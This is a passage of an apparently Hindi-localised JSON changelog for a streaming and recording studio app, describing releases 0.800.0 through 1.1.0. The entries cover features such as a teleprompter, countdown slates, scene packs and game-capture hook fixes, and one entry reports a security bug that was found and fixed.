बचा रह जाता था और पंप हमेशा आख़िरी फ़्रेम पर ही घूमता रहता था: न कभी बंद होता, न कभी ऑटो-रिकवरी शुरू करता। अब ऐप OS से पूछता है कि गेम अब भी चल रहा है या नहीं।","changelog.8f6e3e5d64ef":"<strong>जो गेम हुक को धीरे लोड करता है, उसके क्रैश होने का ख़तरा अब नहीं है।</strong> इंजेक्शन टाइमआउट होने पर रिमोट पेज मुक्त कर दिया जाता था, जबकि गेम का <code>LoadLibraryW</code> तब भी उसे पढ़ रहा हो सकता था। अब पेज तभी मुक्त किया जाता है जब यह पक्का हो जाए कि वह थ्रेड बाहर निकल चुका है।","changelog.76d466ce9bcf":"<strong>विफल arming को दोबारा आज़माया जा सकता है।</strong> अगर कंट्रोल-ब्लॉक मैपिंग विफल होती थी, तो &quot;installed&quot; फ़्लैग सेट ही रह जाता था, इसलिए प्रोसेस हमेशा के लिए आधा-सक्रिय रह जाता था: इंजेक्ट किया हुआ, कभी कुछ publish न करता हुआ, और उबरने में असमर्थ। हुक की स्थिति अब vtable स्लॉट पैच होने से <em>पहले</em> publish की जाती है — बीच में आने वाले किसी present को कोई स्थिति नहीं मिलती थी और वह असली <code>Present</code> तक आगे बढ़ाए बिना <code>S_OK</code> लौटा देता था, जिससे उस फ़्रेम का flip चुपचाप निगल लिया जाता था।","changelog.1fdb03f5eeaf":"<strong>वर्चुअल-कैमरा सोर्स DLL अब इस्तेमाल के दौरान अनलोड नहीं किया जा सकता।</strong> <code>DllCanUnloadNow</code> बिना किसी शर्त के <code>S_OK</code> जवाब देता था — जबकि COM <em>इसी</em> export के ज़रिए पूछता है — इसलिए frame-server होस्ट में एक <code>CoFreeUnusedLibraries</code> उसे तब भी अनलोड कर सकता था जब कोई कॉन्फ़्रेंसिंग ऐप अब भी मीडिया सोर्स पकड़े हुए हो। अब यह ऑब्जेक्ट और सर्वर-लॉक की असली गिनती बताता है। <code>Shutdown</code> अब सोर्स↔स्ट्रीम के बीच के उस मज़बूत रेफ़रेंस चक्र को भी तोड़ता है जिसकी वजह से हर बार कैमरा खोलने पर मेमोरी लीक होती थी।","changelog.686194fae62e":"<strong>उपयोगकर्ता को दिखने वाली दो स्ट्रिंग में फ़ालतू स्पेस की लड़ियाँ थीं</strong>, जो लाइन-रैप की वजह से उनमें घुस गई थीं (पिन किए गए CEF वाली कंपोनेंट त्रुटि और गैर-Windows वर्चुअल-कैमरा टूलटिप)।","changelog.faf05b9b72f7":"[1.1.0] — 2026-07-20 (गहरा कैप्चर और वेब — चरण 10, पहला हिस्सा)","changelog.4eb7f2b2ea1d":"<strong>1.0 के बाद की गहराई शुरू होती है।</strong> चरण 10 लंबे समय से &quot;अपने अलग माइलस्टोन&quot; वाले तीन कैप्चर क्षेत्रों — वर्चुअल कैमरा, असली ब्राउज़र सोर्स और गेम कैप्चर — को एक ठीक से निर्धारित बिल्ड के रूप में शुरू करता है। यह रिलीज़ वह हिस्सा शिप करती है जो पूरा और स्वतंत्र है: <strong>रुकने पर एक साझा करने योग्य कॉपी का ऑटो-एक्सपोर्ट (CAP-N75)</strong>, रोडमैप का वह फ़ीचर जो Build 12 से बाक़ी था। ब्राउज़र-सोर्स और वर्चुअल-कैमरा रनटाइम साइन किए गए/कंपोनेंट उप-माइलस्टोन हैं जो बाद की रिलीज़ में आएँगे; उनके लिए अभी उपयोगकर्ता के सामने कुछ भी नहीं खोला गया है। हर नई चीज़ डिफ़ॉल्ट रूप से बंद शिप होती है, लोकल रहती है, और कोई नेटवर्क कॉल नहीं जोड़ती।","changelog.f4bd0df9d9a9":"<strong>रुकने पर एक साझा करने योग्य MP4 का ऑटो-एक्सपोर्ट (CAP-N75)</strong> — <strong>सेटिंग्स → आउटपुट</strong> में एक टॉगल, <em>&quot;मास्टर के साथ एक साझा-योग्य MP4 भी सहेजें&quot;</em> (सिर्फ़ तब दिखता है जब रिकॉर्डिंग ऐप के अपने <code>.frec</code> फ़ॉर्मैट में हो रही हो, <strong>डिफ़ॉल्ट रूप से बंद</strong>)। जब कोई <code>.frec</code> रिकॉर्डिंग पूरी होती है, तो बैकग्राउंड में चलने वाला एक एक्सपोर्ट उसके बगल में डबल-क्लिक से चलने वाली एक MP4 कॉपी लिखता है — जो रिकॉर्डिंग डायलॉग की रिकॉर्डिंग-पश्चात कतार में दिखती है — उसी एनकोड पाथ से जिसका इस्तेमाल मैनुअल एक्सपोर्ट करता है, और टकराव से सुरक्षित नामकरण के साथ। लॉसलेस <code>.frec</code> मास्टर को कभी छुआ नहीं जाता, और कॉपी किसी भी रिकॉर्डिंग-पश्चात पाइपलाइन से पहले कतार में लगाई जाती है, ताकि कोई &quot;ले जाएँ&quot; चरण मास्टर को उसके नीचे से खिसका न सके। क्रैश में भी बचाया जा सकने वाला मास्टर रखें <strong>और</strong> साथ में मुफ़्त में एक साझा करने योग्य फ़ाइल भी पाएँ।","changelog.8a7525b1492f":"नोट्स","changelog.684a3421d35f":"नींव रखी गई (इस रिलीज़ में उपयोगकर्ता के लिए उपलब्ध नहीं): <strong>असली ब्राउज़र सोर्स</strong> (CAP-N77) का ऐप वाला हिस्सा और उसका हेल्पर-प्रोसेस CEF आर्किटेक्चर, और <strong>वर्चुअल-कैमरा</strong> ट्रांसपोर्ट सीम — दोनों साइन किए गए/कंपोनेंट रनटाइम का इंतज़ार कर रहे हैं जो अपने अलग उप-माइलस्टोन के रूप में शिप होंगे। रोडमैप का चरण 10 देखें।","changelog.1255703a672a":"[1.0.0] — 2026-07-19 (स्थिर — स्ट्रीम-प्रोडक्शन ओवरले और लॉन्च से पहले का निखार)","changelog.c682627010fd":"<strong>1.0.0 स्थिर रिलीज़।</strong> गिना हुआ 100-फ़ीचर लक्ष्य (26 CAP-M अनिवार्य + 74 CAP-N वैकल्पिक फ़ीचर) 0.900.0 पर ही पूरा हो गया था; यह रिलीज़ 1.0.0 के लिए रोके गए लॉन्च-निखार वाले पाँच फ़ीचर शिप करती है — शो से पहले की काउंटडाउन स्लेट, एक सोशल बार, एक विशेष चैट बैनर, मोडल डेप्थ-ऑफ़-फ़ील्ड, और सीन इतिहास की सफ़ाई — साथ में प्लेयर/ऑडियो सुधारों का एक दौर। हर नई चीज़ डिफ़ॉल्ट रूप से बंद/बिना बाइंडिंग के शिप होती है, लोकल रहती है, और कोई नेटवर्क कॉल नहीं जोड़ती।","changelog.13b71822377f":"<strong>&quot;जल्द शुरू&quot; काउंटडाउन स्लेट (V1-C)</strong> — स्रोत जोड़ें से एक क्लिक: पूरे कैनवस पर एक काउंटडाउन (बड़ी घड़ी के ऊपर कैप्शन) जो 12-घंटे वाले घड़ी पिकर (घंटे 1–12, मिनट 5-मिनट के चरणों में, AM/PM) पर चुने गए घड़ी के किसी असली समय तक उलटी गिनती करता है। शून्य पर यह <strong>चमकता है और वहीं रुका रहता है</strong> — होस्ट इसे हटाता है और ख़ुद हाथ से लाइव पर कट करता है; कभी अपने-आप स्विच नहीं होता। पृष्ठभूमियाँ: दो-रंग का ग्रेडिएंट, एक ठोस रंग, एक स्थिर इमेज (एम्बेड की हुई, contain-fit, बीच में, कभी क्रॉप नहीं), या सीन की लूप होती पृष्ठभूमि पर चलता <strong>GIF/वीडियो</strong> — साथ में उसी डायलॉग में चुना गया वैकल्पिक <strong>पृष्ठभूमि संगीत</strong> (mp3/wav/flac/m4a/aac/ogg/opus)। काउंटडाउन प्रोग्राम में कंपोज़ होता है, इसलिए स्ट्रीम/रिकॉर्डिंग के दर्शक इसे देखते हैं।","changelog.110b8b024a21":"<strong>पृष्ठभूमि संगीत सोर्स</strong> — स्रोत जोड़ें → पृष्ठभूमि संगीत…: एक या ज़्यादा ऑडियो फ़ाइलें एक अदृश्य, लूप होती प्लेलिस्ट के रूप में (वैकल्पिक शफ़ल), अपने-आप मॉनिटर की हुई, ताकि वह प्रीव्यू में सुनाई दे और रिकॉर्डिंग/स्ट्रीम में कैप्चर हो; इसे जोड़ने पर वीडियो पृष्ठभूमि की अपनी आवाज़ म्यूट हो जाती है, ताकि <strong>एक समय में सिर्फ़ एक ही पृष्ठभूमि आवाज़ बजे</strong>।","changelog.6c522580be6b":"<strong>सोशल और चैनल बार सोर्स (V1-D)</strong> — आपके हैंडल की सूची दिखाने वाला एक जनरेट किया गया ओवरले: बंडल की हुई प्लेटफ़ॉर्म पंक्तियाँ (YouTube, Twitch, Kick, X, Instagram, TikTok, Facebook, Discord) ब्रांड-रंग वाले बैज के रूप में, साथ में कस्टम पंक्तियाँ और एक वैकल्पिक हेडर; हर पंक्ति/हैंडल प्रॉपर्टीज़ में संपादित किया जा सकता है।","changelog.9d0f60a20a05":"<strong>विशेष चैट संदेश बैनर (V1-E)</strong> — कोई भी हाल की चैट पंक्ति चुनें (चल रहे हर चैट ओवरले में से) और उसे नीचे एक स्टाइल किए गए बैनर के रूप में प्रोग्राम पर पिन करें; रंग सेटिंग्स में सहेजे रहते हैं, जबकि पिन ख़ुद जान-बूझकर अस्थायी है। एक क्लिक से हटाया जाता है।","changelog.18f4b83dbd99":"<strong>मोडल डेप्थ-ऑफ़-फ़ील्ड (V1-A)</strong> — हर मोडल अपने पीछे के स्टूडियो को धुँधला और मद्धम कर देता है (थीम के अनुसार, कम-गति/पारदर्शिता की प्राथमिकताओं का पालन करते हुए); टेलीप्रॉम्प्टर जैसी साथी सतहें धुँधली नहीं होतीं, ताकि ऑपरेटर पढ़ता रह सके।","changelog.501b690add0e":"<strong>सीन इतिहास की सफ़ाई (V1-B)</strong> — हाल के सीन की एक सूची, जिसमें एक क्लिक वाला <strong>इतिहास साफ़ करें</strong> (पुष्टि के साथ) है, साथ में सीन कलेक्शन → इतिहास साफ़ करें, जिससे बेकार संग्रह एक साथ हटाए जा सकते हैं (सक्रिय संग्रह को कभी छुआ नहीं जाता)।","changelog.c993200abe94":"<strong>ऑडियो विज़ुअलाइज़र के क्लासिक रंग</strong> — प्रॉपर्टीज़ में एक चेकबॉक्स बार/VU को क्लासिक हरे→पीले→लाल ब्रॉडकास्ट क्रम पर बदल देता है (स्कोप को फ़ॉस्फ़र जैसा हरा रंग मिलता है); बंद = एक ही ठोस रंग।","changelog.2581bdff5166":"<strong>रिहर्सल रिकॉर्ड करें</strong> — रिहर्सल शुरू करते समय अब उसे एक सामान्य वीडियो फ़ाइल में रिकॉर्ड करने का विकल्प भी मिलता है (सिर्फ़ तब जब पहले से कुछ रिकॉर्ड न हो रहा हो; रिकॉर्डिंग रिहर्सल के साथ ही रुक जाती है), ताकि एक अभ्यास-रन कभी लाइव गए बिना संपादन और अपलोड के लिए मास्टर बन सके।","changelog.3d3a4c1d8909":"<strong>मीडिया प्लेलिस्ट की कोई मिक्सर स्ट्रिप नहीं थी</strong> — UI की ऑडियो-प्रकार वाली सूची में <code>playlist</code> (और <code>replayPlayback</code>) नहीं था, इसलिए प्लेलिस्ट को न फ़ेड किया जा सकता था, न म्यूट, न मॉनिटर; अब दोनों को अपनी स्ट्रिप मिलती है।","changelog.5a87688dfb99":"<strong>सिर्फ़-ऑडियो प्लेलिस्ट का चेहरा</strong> — अब <strong>मौजूदा ट्रैक का नाम</strong> दिखाता है (साफ़ टेक्स्ट, कोई टूटा ग्लिफ़ बॉक्स नहीं); पृष्ठभूमि-संगीत वाली प्लेलिस्ट कुछ भी नहीं बनातीं। वीडियो प्लेलिस्ट में कोई बदलाव नहीं है।","changelog.7f672b15fac6":"<strong>काउंटडाउन/पृष्ठभूमि की फ़िटिंग</strong> — इमेज/GIF/वीडियो पृष्ठभूमियाँ अब cover-crop होने के बजाय letterbox (contain) होकर बीच में रहती हैं, ताकि पूरी तस्वीर हमेशा दिखे।","changelog.fb60af02a1ed":"<strong>समीक्षा का दौर (रिलीज़ से पहले)</strong> — सुरक्षा जाँच ने एक HIGH समस्या पकड़ी: काउंटडाउन स्लेट का इमेज पाथ रेंडर लूप में उस नेटवर्क-पाथ गार्ड के बिना पढ़ा जाता था जो इसके जैसे हर दूसरे पाथ पर है (एक UNC पाथ किसी शत्रुतापूर्ण सीन संग्रह तक NTLM हैश लीक कर देता) — अब उसे पहले ही अस्वीकार कर दिया जाता है। कोड समीक्षा ने 11 और पकड़ीं, सब ठीक कर दी गईं: 240 px से संकरे कैनवस पर रेंडर-लूप panic; रिहर्सल-रिकॉर्डिंग का एक पुराना फ़्लैग जो उपयोगकर्ता द्वारा हाथ से शुरू की गई रिकॉर्डिंग रोक सकता था; हाल के सीन की सूची में वह सीन दिखना जो पहले से प्रोग्राम पर है (और undo/redo का उस सिर्फ़-सत्र वाली सूची को पलट देना); बैनर का रंग बदलने पर पहले से पिन किया हुआ बैनर दोबारा न बनना; घड़ी पिकर का पुराने ऐसे लक्ष्यों को चुपचाप गोल कर देना जो 5 मिनट के गुणक नहीं थे; विफल स्लेट इमेज का हर सेकंड फिर से कोशिश करना (और लॉग करना); पारदर्शी स्लेट PNG का अपारदर्शी रेंडर होना; और कई तरह का दोहराव, जो अब साझा है (एक ऑडियो-एक्सटेंशन सूची, एक घड़ी पिकर, गोल कोनों वाला आयत बनाने वाला एक पेंटर)।","changelog.c5d49f26f5b2":"[0.910.0] — 2026-07-19 (टेलीप्रॉम्प्टर का नया रूप)","changelog.f500d8210c1a":"<em>प्रॉम्प्टर परिपक्व होता है।</em> 0.800.0 में शिप हुए टेलीप्रॉम्प्टर का एक केंद्रित पुनर्निर्माण: विराम अब असली ऑब्जेक्ट हैं जिन्हें आप ग़लती से नहीं बिगाड़ सकते, स्क्रॉल किसी गाने की लय के साथ चल सकता है, एक वैकल्पिक प्री-रोल प्रस्तुतकर्ता के लिए गिनती करता है, प्रोजेक्टर मुख्य विंडो ऑपरेटर को वापस सौंप देता है, और स्क्रिप्ट ख़ुद को ज़ोर से पढ़ सकती है या टाइप करते समय आपके शब्द पूरे कर सकती है। हर नई चीज़ लोकल है और डिफ़ॉल्ट रूप से बंद/तटस्थ है — ऑटोकम्प्लीट शब्दकोश साधारण लोकल डेटा फ़ाइलें हैं (ज़रूरत पड़ने पर लोड, एक समय में एक भाषा) और ज़ोर से पढ़ें ऑपरेटिंग सिस्टम के अपने वॉइस इंजन से बोलता है; न कुछ बंडल किया गया है और न कुछ डाउनलोड किया जाता है।","changelog.fd0ed8487a73":"<strong>सीज़ुरा विराम चिप</strong> — <code> -- </code> (एक ठहराव) या <code> --N </code> (N सेकंड का ठहराव) के रूप में लिखा गया इनलाइन विराम अब स्क्रिप्ट एडिटर में एक अविभाज्य पिल के रूप में दिखता है: कर्सर उसके भीतर नहीं जा सकता, एक बार <strong>Delete/Backspace</strong> दबाने से पूरा टोकन हट जाता है (कभी कोई अकेला डैश नहीं बचता), और कॉपी/पेस्ट मार्कर को ज्यों का त्यों ले जाता है। एक विराम चार अलग-अलग अक्षरों के बजाय एक ही ऑब्जेक्ट की तरह पढ़ा और संपादित होता है।","changelog.29694897048a":"<strong>काउंटडाउन शुरू करें</strong> — स्क्रॉल शुरू होने से पहले एक वैकल्पिक <strong>3-2-1</strong> प्री-रोल, जो ऑपरेटर प्रीव्यू और प्रस्तुतकर्ता के प्रोजेक्टर दोनों पर दिखता है, ताकि टेक्स्ट चलने से पहले पढ़ने वाले को साँस लेने का एक पल मिल जाए।","changelog.645e73577cff":"<strong>BPM मोड</strong> — स्क्रॉल की गति अक्षर प्रति सेकंड के बजाय <strong>बीट प्रति मिनट (50–250)</strong> में तय करें, ताकि संगीत की लय के साथ गीत पढ़े जा सकें। मोड जब चाहें बदलें; बदलाव चल रहे स्क्रॉल की गति <strong>तुरंत</strong> बदल देता है।","changelog.a1ef18efc830":"<strong>असली ट्रांसपोर्ट आइकन</strong> — प्रोजेक्टर और ऑपरेटर पैनल में अब प्लेसहोल्डर ग्लिफ़ की जगह सही <strong>SVG</strong> चलाएँ / ठहराएँ / रोकें / रिवाइंड / फ़ास्ट-फ़ॉरवर्ड / फिर से शुरू नियंत्रण हैं।","changelog.ccfc933d79f9":"<strong>प्रोजेक्टर मुख्य विंडो को मुक्त करता है</strong> — प्रस्तुतकर्ता का प्रोजेक्टर खोलने पर अब <strong>ऑपरेटर मोडल बंद हो जाता है</strong>, ताकि प्रस्तुतकर्ता के पढ़ते समय आप मुख्य विंडो से अपनी लाइवस्ट्रीम चला सकें। अगर शुरुआती काउंटडाउन सक्रिय हो, तो खुलते ही प्रोजेक्टर <strong>अपने-आप शुरुआत पर लौटता है, उलटी गिनती करता है और शुरुआत से चलाता है</strong> — एक ही क्रिया पढ़ने वाले को शून्य पर रखकर स्क्रिप्ट चला देती है।","changelog.90ca5a72ccb0":"<strong>ज़ोर से पढ़ें</strong> — किसी स्क्रिप्ट को ऑपरेटिंग सिस्टम के <strong>अपने स्पीच सिंथेसिस</strong> से सुनकर जाँचें — Windows पर <strong>SAPI 5 / OneCore</strong>, macOS पर <strong>AVSpeechSynthesis</strong>, और Linux पर Web Speech API या, जहाँ इंस्टॉल हो, <strong><code>spd-say</code> / <code>espeak-ng</code></strong> विकल्प। कोई TTS इंजन बंडल नहीं है; OS की आवाज़ जैसी है वैसी ही इस्तेमाल होती है। <code>THIRD-PARTY.md</code> देखें।","changelog.5689e3adcf62":"<strong>घोस्ट-टेक्स्ट ऑटोकम्प्लीट</strong> — टाइप करते समय हल्के-धूसर शब्द और वाक्यांश सुझाव इनलाइन दिखते हैं और <strong>Tab</strong> से स्वीकार किए जाते हैं। <strong>ऐप की 18 भाषाओं</strong> में से हर एक का अपना शब्दकोश है, जो सिर्फ़ उसी भाषा के लिए ज़रूरत पड़ने पर लोड होता है जिसमें आप लिख रहे हैं। शब्दकोश के स्रोत और उनके <strong>CC-BY / अनुमेय</strong> लाइसेंस (Tatoeba, SCOWL, Leipzig Corpora, OpenTaal, …) <code>THIRD-PARTY.md</code> में सूचीबद्ध हैं।","changelog.f1248a45cf83":"<strong>प्रीव्यू ↔ प्रोजेक्टर रैप का मिलान</strong> — अब पंक्तियाँ ऑपरेटर प्रीव्यू और फ़ुलस्क्रीन प्रोजेक्टर पर बिल्कुल एक ही जगह टूटती हैं, ताकि जिस पंक्ति पर आप संकेत देते हैं, प्रस्तुतकर्ता वही पंक्ति पढ़े। प्रोजेक्टर स्क्रिप्ट को एक निश्चित आकार के स्टेज पर रेंडर करता है जिसे CSS से मॉनिटर के अनुसार स्केल किया जाता है, इसलिए बड़ी स्क्रीन पर पंक्ति अब किसी दूसरी जगह नहीं टूट सकती।","changelog.33a14cdb624d":"<strong>सीक-बार का बीता-समय टाइमर</strong> — बीते समय की रीडिंग अब कुल पढ़ने के समय से <strong>आगे</strong> नहीं बढ़ती; स्क्रिप्ट पूरी स्क्रॉल हो जाने के बाद हमेशा गिनती बढ़ाते रहने के बजाय यह अंत पर रुक जाती है।","changelog.a757a5cd6973":"<strong>कोई नई बंडल की गई रनटाइम निर्भरता नहीं और कोई नया नेटवर्क कॉल नहीं।</strong> ऑटोकम्प्लीट शब्दकोश लोकल JSON डेटा हैं (हर भाषा के लिए एक फ़ाइल, सक्रिय भाषा के लिए ज़रूरत पड़ने पर लोड), और ज़ोर से पढ़ें मशीन पर पहले से मौजूद स्पीच इंजन को चलाता है — रनटाइम पर कुछ भी डाउनलोड नहीं होता। डेटा और स्पीच इंजन के श्रेय <code>THIRD-PARTY.md</code> में हैं। हर नया नियंत्रण और मोड सभी 18 भाषाओं में स्थानीयकृत है।","changelog.6c151934cc4a":"[0.900.0] — 2026-07-18 (स्टूडियो प्रबंधन और वर्कफ़्लो — चरण 8)","changelog.db7b34e4b837":"<em>अपने स्टूडियो के मालिक बनें।</em> चरण 8 पूरे लेआउट को पोर्टेबल और साझा करने योग्य बनाता है, आपके सीन के लिए वर्ज़न कंट्रोल जोड़ता है, आपकी सबसे ज़्यादा इस्तेमाल होने वाली क्रियाओं को एक टैप की दूरी पर रखता है, और पूरी थीमिंग और USB-स्टिक वाला पोर्टेबल मोड उपलब्ध कराता है। सब कुछ पूरी तरह लोकल है — न कोई नई निर्भरता और न कोई नया नेटवर्क कॉल।","changelog.197ef0e08085":"<strong>सीन-संग्रह पैक — निर्यात/आयात (CAP-N60)</strong> — पूरे लेआउट (सीन ग्राफ़ और उसके लोकल एसेट: इमेज, मीडिया, LUT, मास्क, फ़ॉन्ट) को एक पोर्टेबल <code>.fcappack</code> में बंडल करें और उसे एक ही फ़ाइल के रूप में साझा करें। आयात लक्ष्य मशीन पर एसेट को फिर से लिंक करता है; URL/UNC पाथ <em>बाहरी</em> के रूप में दर्ज होते हैं और उन्हें कभी stat नहीं किया जाता; फ़ॉन्ट को श्रेय देने के लिए चिह्नित किया जाता है। न कोई मार्केटप्लेस, न कोई सर्वर।","changelog.1993c99e5fa2":"<strong>सीन-संग्रह की तुलना और मर्ज (CAP-N61)</strong> — सक्रिय संग्रह की तुलना किसी दूसरे संग्रह, किसी <code>.fcappack</code> या किसी स्नैपशॉट से करें; जोड़े गए / हटाए गए / बदले गए सीन, सोर्स, और हर आइटम का ट्रांसफ़ॉर्म / फ़िल्टर / दृश्यता देखें; फिर <strong>चुन-चुनकर</strong> तय करें कि ठीक-ठीक कौन-से बदलाव मर्ज करने हैं (चुना गया सीन अपने इस्तेमाल किए गए सोर्स साथ लाता है)। बिना क्लाउड के दो संस्करणों का मेल बिठाएँ।","changelog.e1355c54d6d7":"<strong>नामित संस्करण स्नैपशॉट (CAP-N62)</strong> — सक्रिय संग्रह के एक-क्लिक वाले नामित चेकपॉइंट, एक ब्राउज़ करने योग्य टाइमलाइन, पुनर्स्थापना और एक तुलना दृश्य (जो तुलना टूल का ही दोबारा इस्तेमाल करता है) के साथ। ऑटोसेव और undo के साथ-साथ जान-बूझकर रखा गया इतिहास; अधिकतम 50, डिस्क उपयोग साफ़ बताया जाता है, और एक &quot;पुनर्स्थापना से पहले&quot; चेकपॉइंट ताकि पुनर्स्थापना कभी एकतरफ़ा न हो।","changelog.afc196f3991b":"<strong>पोर्टेबल मोड (CAP-N63)</strong> — executable के बगल में एक <code>freally-portable.txt</code> मार्कर रख दें, और ऐप का सारा डेटा (सेटिंग्स, प्रोफ़ाइल, संग्रह) exe के फ़ोल्डर में ही रहता है — होस्ट OS की प्रोफ़ाइल को छुए बिना पूरा स्टूडियो एक USB स्टिक से चलाएँ। सेटिंग्स → परिचय पोर्टेबल स्थिति और डेटा का स्थान दिखाता है।","changelog.4072af7dcc85":"<strong>एक-फ़ाइल बैकअप और पुनर्स्थापना (CAP-N64)</strong> — सब कुछ (सेटिंग्स, प्रोफ़ाइल, सीन संग्रह) एक संस्करण-युक्त <code>.fcapbackup</code> फ़ाइल में निर्यात करें, और उसे यहीं या किसी नई मशीन पर चुनिंदा रूप से पुनर्स्थापित करें (माइग्रेशन फ़्लो)। गोपनीय जानकारी — स्ट्रीम कुंजियाँ, पासवर्ड — बैकअप से हमेशा हटा दी जाती है; सर्वर के स्वामित्व वाले फ़ील्ड (EULA, ऑनबोर्डिंग, कैमरा प्रोफ़ाइल) पुनर्स्थापना पर बनाए रखे जाते हैं।","changelog.6b0e17039cce":"<strong>थीम एडिटर (CAP-N65)</strong> — CSS-वेरिएबल थीम के ऊपर एक विज़ुअल एडिटर: लाइव <strong>WCAG कंट्रास्ट</strong> चेतावनियों के साथ पूरी छह-रंग की पैलेट बनाएँ, और साझा की जा सकने वाली <code>.fctheme</code> फ़ाइलें निर्यात/आयात करें।","changelog.1f2d5f8ca405":"<strong>डॉक लेआउट प्रीसेट (CAP-N66)</strong> — नामित व्यू लेआउट (स्टैट्स-डॉक की दृश्यता + मिक्सर का अभिविन्यास) सहेजें और उनके बीच स्विच करें।","changelog.a66f42ada61a":"<strong>सेटिंग्स खोज और हाल में बदली गई सेटिंग्स (CAP-N67)</strong> — सेटिंग्स मोडल के ऊपर एक खोज फ़ील्ड (हर श्रेणी कीवर्ड से इंडेक्स की गई, सीधे वहाँ पहुँचें) और हर श्रेणी के लिए एक &quot;खोलने के बाद से बदला गया&quot; मार्कर।","changelog.5331e00f8cd2":"<strong>त्वरित-क्रियाएँ ग्रिड (CAP-N68)</strong> — Stream Deck जैसा एक अनुकूलन योग्य बटन बोर्ड (सीन, कमांड, मैक्रो, साउंडबोर्ड पैड), हर बटन के अपने रंग और पेजों के साथ; कमांड बटन वही allowlist वाली स्टूडियो क्रियाएँ चलाते हैं जो हॉटकी और LAN पैनल चलाते हैं, और ग्रिड का कॉन्फ़िगरेशन <strong>CAP-N06 LAN पैनल के साथ साझा</strong> है।","changelog.5217d787621c":"<strong>टेलीप्रॉम्प्टर प्रोजेक्टर</strong> — &quot;प्रोजेक्टर खोलें&quot; एक ख़ाली विंडो खोलता था जिसे बंद नहीं किया जा सकता था (वह बिना बॉर्डर और बिना टाइटल बार की थी, और उसका IPC अनधिकृत था)। अब यह एक सामान्य, बंद की जा सकने वाली विंडो के रूप में खुलता है जो स्क्रॉल होती स्क्रिप्ट दिखाती है; <strong>Esc</strong> उसे बंद कर देता है। <strong>फ़ाइल → बाहर निकलें</strong> भी अब भरोसेमंद ढंग से ऐप बंद करता है (मुख्य विंडो के पास विंडो बंद करने की अनुमति नहीं थी)।","changelog.a9bceee9f47d":"<strong>टेलीप्रॉम्प्टर डायलॉग</strong> — एक <strong>रोकें</strong> बटन (ठहराव + शुरुआत पर वापस), ताकि चलाने के बाद छोटी स्क्रिप्ट ख़ाली न दिखे और टेक्स्ट को फिर से पढ़ा और संपादित किया जा सके।","changelog.2e825abc071d":"<strong>सोर्स पैनल</strong> — हर सोर्स को हटाने और उसका क्रम बदलने वाले नियंत्रण सिर्फ़ होवर पर दिखते थे और रेल से कटकर छिप सकते थे; अब हर सोर्स में हमेशा दिखने वाली एक <strong>ऊपरी नियंत्रण पट्टी</strong> है (लाइव/REC · लॉक · क्रम बदलें · फ़िल्टर · प्रॉपर्टीज़ · क्लोन · हटाएँ)।","changelog.78b6f1cfd693":"<strong>कोई नई निर्भरता नहीं</strong> (<code>zip</code> क्रेट पहले से vendored था) और <strong>कोई नया नेटवर्क कॉल नहीं</strong>: पैक / बैकअप / स्नैपशॉट / थीम फ़ीचर पूरी तरह लोकल फ़ाइलें हैं; त्वरित क्रियाओं की LAN साझेदारी मौजूदा ऑप्ट-इन CAP-N06 वेब पैनल से ही होती है। <code>wix.version</code> 0.253.0 → 0.254.0 किया गया (MSI माइनर सीमा)।","changelog.871a49bf7084":"[0.800.0] — 2026-07-17 (रिमोट मेहमान और शो प्रोडक्शन — चरण 7)","changelog.72750cf3fb55":"<em>&quot;मेहमान जुड़ते हैं&quot; से &quot;एक तैयार शो&quot; तक।</em> चरण 7 रिमोट-मेहमान सत्र को कई मेहमानों वाले स्टूडियो में बदल देता है और उसके ऊपर लाइव-प्रोडक्शन की परत जोड़ता है: लाइव प्रोग्राम पर ड्रॉ करें, टेलीप्रॉम्प्टर चलाएँ, मेहमानों को ऑन एयर जाने से पहले ग्रीन रूम में रोककर रखें, उन्हें निजी संकेत भेजें, हर मेहमान की कनेक्शन गुणवत्ता देखें, और सबको अपने-आप बनने वाले ग्रिड में फिर से व्यवस्थित करें। रिमोट-मेहमान ट्रांसपोर्ट अब <strong>आठ तक मेहमान</strong> स्वीकार करता है (होस्ट + 8 = 1–9 की गैलरी)। सब कुछ मौजूदा ऑप्ट-इन P2P सत्र पर ही चलता है — न कोई नया ब्रोकर, न Mike का चलाया कोई सर्वर, न कुछ ऐसा जो अपने-आप जुड़ जाए — और हर नई सतह डिफ़ॉल्ट रूप से बंद या बिना बाइंडिंग के है।","changelog.c6ee3e56912f":"<strong>टेलीस्ट्रेटर — लाइव प्रोग्राम पर ड्रॉ करें (CAP-N57)</strong> — बाहर जाने वाली फ़ीड पर पेन, हाइलाइटर, तीर और दीर्घवृत्त टूल से निशान लगाएँ, जो प्रोग्राम में कंपोज़ होते हैं, ताकि निशान उसी पल रिकॉर्डिंग और स्ट्रीम में पहुँचें जब आप उन्हें बनाते हैं (सिर्फ़ आपके प्रीव्यू में नहीं)। निशान तय समय के बाद धुँधले होकर मिट जाते हैं, या व्हाइटबोर्ड मोड पर स्विच करें ताकि वे तब तक बने रहें जब तक आप उन्हें साफ़ न करें। टैबलेट के दबाव को पहचानता है; साफ़ करने की एक हॉटकी (जब तक आप उसे असाइन न करें, बिना बाइंडिंग के)। सीधे तैयार प्रोग्राम के ऊपर बनाया जाता है, इसलिए यह हर आउटपुट तक पहुँचता है — CAP-N53 के सिर्फ़-स्ट्रीम / सिर्फ़-रिकॉर्डिंग वाले रूपों समेत।","changelog.2b2452ceb3fd":"<strong>टेलीप्रॉम्प्टर (CAP-N58)</strong> — एक साथ तीन सतहों पर सहजता से स्क्रॉल होती स्क्रिप्ट: ऐप के भीतर एक पैनल, प्रस्तुतकर्ता के लिए एक फ़ुलस्क्रीन प्रोजेक्टर (बीम-स्प्लिटर ग्लास के लिए मिरर मोड के साथ), और LAN टच पैनल पर एक व्यू। सादा टेक्स्ट या हल्के Markdown वाली स्क्रिप्ट, समायोज्य गति और फ़ॉन्ट। स्क्रॉल का नियंत्रण हॉटकी, MIDI, OSC या LAN पैनल से — स्क्रॉल ऑफ़सेट साझा है, इसलिए हर सतह एक साथ चलती है।","changelog.eba68ba03d3d":"<strong>रिमोट मेहमानों के लिए ग्रीन रूम (CAP-N54)</strong> — नए मेहमान एक निजी प्रतीक्षा स्थिति में आ सकते हैं: आप प्रोग्राम से बाहर, एक मॉनिटर में उनका कैमरा और कैम/माइक की तकनीकी जाँच देखते हैं, और एक क्लिक में उन्हें ऑन एयर बैठा देते हैं। वैकल्पिक (डिफ़ॉल्ट रूप से बंद); मेहमान को डेस्कटॉप ऐप और वेब जॉइन पेज, दोनों पर &quot;आप ग्रीन रूम में हैं&quot; बैनर दिखता है।","changelog.7576d4597bb5":"<strong>संकेत और बातचीत प्रणाली (CAP-N55)</strong> — जुड़े 